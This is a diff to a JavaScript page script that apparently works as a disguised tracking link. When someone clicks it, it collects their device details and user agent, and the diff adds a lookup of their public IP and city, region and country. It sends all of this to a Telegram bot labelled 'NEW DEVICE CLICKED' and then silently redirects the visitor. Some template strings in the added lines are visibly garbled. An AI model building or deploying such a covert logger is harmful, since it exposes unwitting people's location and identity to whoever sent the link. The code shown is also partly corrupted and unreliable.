@@ -28,11 +28,10 @@
                     osVersion = versionMatch[1];
                 }
 
-                // This logic will capture the 'K' on sanitized UAs, which is expected.
                 let modelMatch = ua.match(/\(([^;]+); Android [^;]+; ([^)]+)\)/);
                 if (modelMatch && modelMatch[2]) {
                     let modelSegment = modelMatch[2].trim();
-                    if (modelSegment.length <= 2) { // Check for sanitized 'K'
+                    if (modelSegment.length <= 2) {
                         modelMatch = ua.match(/Android [^;]+; ([^;)]+)(?:\sBuild\/)/);
                         if (modelMatch && modelMatch[1]) {
                            modelSegment = modelMatch[1].trim();
@@ -79,8 +78,22 @@
             
             const uaString = navigator.userAgent;
 
+            // === NEW: Get public IP + basic geolocation ===
+            let ipInfo = 'Unknown IP';
             try {
-                // --- Modern Approach: User-Agent Client Hints ---
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                ipInfo = `\( {data.ip} ( \){data.city}, \( {data.region}, \){data.country_name})`;
+            } catch(e) {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ipInfo = data.ip || 'IP fetch failed';
+                } catch(err) {}
+            }
+            // ============================================
+
+            try {
                 if (navigator.userAgentData) {
                     const uaData = await navigator.userAgentData.getHighEntropyValues([
                         "platform",
@@ -94,29 +107,27 @@
                     deviceInfo.manufacturer = uaData.manufacturer || 'Unknown';
                     deviceInfo.model = uaData.model || 'Unknown';
 
-                    // Get browser from low-entropy hints
                     const browserData = navigator.userAgentData.brands.find(b => !b.brand.includes("Not"));
                     deviceInfo.browser = browserData ? browserData.brand : 'Unknown';
 
                 } else {
-                    // --- Fallback Approach: Parse UserAgent String ---
                     deviceInfo = getLegacyDeviceInfo(uaString);
                 }
             } catch (err) {
-                // If anything fails (e.g., user denies prompt), use fallback
                 deviceInfo = getLegacyDeviceInfo(uaString);
             }
 
-            // --- 3. Format and Send Message ---
+            // --- 3. Format and Send Message (now with IP) ---
             const messageText = `
 *--- NEW DEVICE CLICKED ---*
 
 *Time:* ${new Date().toISOString()}
-*OS/Version:* ${deviceInfo.os} (${deviceInfo.osVersion})
+*IP / Location:* ${ipInfo}
+*OS/Version:* \( {deviceInfo.os} ( \){deviceInfo.osVersion})
 *Manufacturer:* ${deviceInfo.manufacturer}
 *Model (Android Priority):* ${deviceInfo.model}
 *Browser:* ${deviceInfo.browser}
-*Screen:* ${screen.width}x${screen.height}
+*Screen:* \( {screen.width}x \){screen.height}
 
 *Raw UA:* \`${uaString}\`
             `.trim();
@@ -132,11 +143,9 @@
                 })
             })
             .catch(err => {
-                // Log error but still redirect
                 console.error('Telegram send failed:', err);
             })
             .finally(() => {
-                // Redirect after a short delay
                 setTimeout(() => {
                     window.location.replace(REDIRECT_URL);
                 }, 1000); 
